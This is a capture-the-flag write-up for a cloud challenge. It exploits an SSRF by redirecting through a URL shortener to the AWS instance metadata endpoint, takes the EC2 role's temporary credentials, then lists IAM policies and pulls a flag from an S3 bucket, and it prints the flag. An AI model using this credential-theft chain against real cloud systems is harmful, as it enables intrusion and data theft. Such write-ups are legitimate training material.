# Villans

**Category:** Cloud

**Author:** @styx00

## Description



http://18.169.78.30/

## Solution
<details>
 <summary>Reveal Spoiler</summary>
It is obvious that there is an SSRF vulnerability. The `apiURL` exposes an internal IP address.

The application requires the value to start with `http://` or `https://`, but it sends a POST request and ignores the user-supplied path.
However, users can bypass both limitations by hosting a web server or using a third-party service such as https://short.gy to redirect the application wherever they desire.

### SSRF

The following short URL points to http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role in order to retrieve the temporary AWS credentials attached to the EC2 instance.

```
https://3us7.short.gy/
```

### Add to your cli profile and fire at will.

```
aws sts get-caller-identity --profile ccsc
```

### Get Attached Policies
```
aws iam list-attached-role-policies --role-name EC2-Role --profile ccsc
```

### Get info for EC2-Read-Bucket policy
```
aws iam get-policy --policy-arn arn:aws:iam::880571524541:policy/EC2-Read-Bucket --profile ccsc
```

### Read EC2-Read-Bucket policy
```
aws iam get-policy-version --version-id v1 --policy-arn arn:aws:iam::880571524541:policy/EC2-Read-Bucket --profile ccsc
```

### Read flag
```
aws s3 cp s3://secret-bucket-flag/flag.txt flag.txt --profile ccsc
```

### Flag
```
 CCSC{0h_myyy_exc3ll3n7_w0rk_lov3_from_R11111111111111ck}
 ```

</details>
